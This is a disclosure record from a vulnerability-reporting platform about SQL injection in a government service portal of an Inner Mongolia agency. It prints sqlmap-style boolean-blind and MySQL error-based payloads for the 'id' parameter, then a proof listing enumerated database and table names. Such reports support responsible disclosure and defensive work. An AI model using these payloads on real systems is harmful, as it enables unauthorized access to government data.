wybug_title: 内蒙古某敏感厅政务服务平台SQL注入
wybug_status: 已交由第三方合作机构(公安部一所)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-15：	细节已通知厂商并且等待厂商处理中									2015-10-18：	厂商已经确认，细节仅向厂商公开									2015-10-28：	细节向核心白帽子及相关领域专家公开									2015-11-07：	细节向普通白帽子公开									2015-11-17：	细节向实习白帽子公开									2015-12-02：	细节向公众公开  简要描述： 内蒙古某敏感厅政务服务平台SQL注入 详细说明：  
**.**.**.**:8188/website/mail/xiangxi.jsp?id=000027670002

---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=000027670002' AND 6345=6345 AND 'aIiE'='aIiE    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=000027670002' AND (SELECT 4900 FROM(SELECT COUNT(*),CONCAT(0x717a6a6a71,(SELECT (ELT(4900=4900,1))),0x71626b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'HifB'='HifB---
   漏洞证明：  
available databases [12]:[*] HSBA[*] hsweb[*] information_schema[*] mysql[*] nmggadb[*] nmggadb1111[*] onedayandroid[*] onedaydb[*] onedayitdb[*] ssweb[*] test[*] zzgadb

Database: nmggadb[43 tables]+---------------------+| buxin               || countnum            || db_key              || dic_data            || dic_type            || imgpic              || info_cominformation || interaction         || jbdh                || jdpy                || jingyuan            || jingyuan_dp         || jmhd                || menu                || message_board       || news                || onlineft            || onlinepl            || petitioning         || shjd                || sqbz                || sqladdress          || suggest             || task                || txl                 || upload_file         || upload_to_file      || visitorcounter      || wf_column           || wf_column_role      || wf_dept             || wf_dept_leader      || wf_dept_manager     || wf_dept_user        || wf_register_user    || wf_role             || wf_user             || wf_user_role        || wsbs_index          || ysqgk               || zwgk                || zwxx                || zzwd                |+---------------------+
